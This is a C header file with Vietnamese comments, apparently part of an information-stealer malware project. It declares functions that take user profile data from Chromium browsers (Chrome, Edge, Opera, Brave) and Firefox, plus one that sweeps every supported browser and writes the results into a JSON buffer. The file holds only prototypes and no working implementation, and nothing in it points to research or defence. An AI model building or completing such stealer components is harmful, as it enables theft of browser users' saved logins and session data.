/**
 * stealer_browser.h
 * Khai bao prototype cho cac ham steal du lieu trinh duyet
 */

#ifndef STEALER_BROWSER_H
#define STEALER_BROWSER_H

#include <stddef.h>

/**
 * Steal du lieu tu trinh duyet Chromium (Chrome, Edge, Opera, Brave, v.v.)
 * Dau vao: duong_dan_trinh_duyet - duong dan thu muc cai dat trinh duyet
 *          duong_dan_profile - duong dan thu muc profile nguoi dung
 *          ket_qua_json - buffer de chua ket qua JSON
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int steal_chromium(const char* duong_dan_trinh_duyet, const char* duong_dan_profile,
                   char* ket_qua_json, size_t kich_thuoc);

/**
 * Steal du lieu tu Firefox
 * Dau vao: duong_dan_profile - duong dan thu muc profile Firefox
 *          ket_qua_json - buffer de chua ket qua JSON
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int steal_firefox(const char* duong_dan_profile, char* ket_qua_json, size_t kich_thuoc);

/**
 * Steal du lieu tu Edge (Chromium-based)
 */
int steal_edge(char* ket_qua_json, size_t kich_thuoc);

/**
 * Steal du lieu tu Opera
 */
int steal_opera(char* ket_qua_json, size_t kich_thuoc);

/**
 * Steal du lieu tu Brave
 */
int steal_brave(char* ket_qua_json, size_t kich_thuoc);

/**
 * Steal du lieu tu tat ca trinh duyet ho tro
 * Dau vao: ket_qua_json - buffer de chua ket qua JSON
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong
 */
int steal_tat_ca_trinh_duyet(char* ket_qua_json, size_t kich_thuoc);

#endif /* STEALER_BROWSER_H */
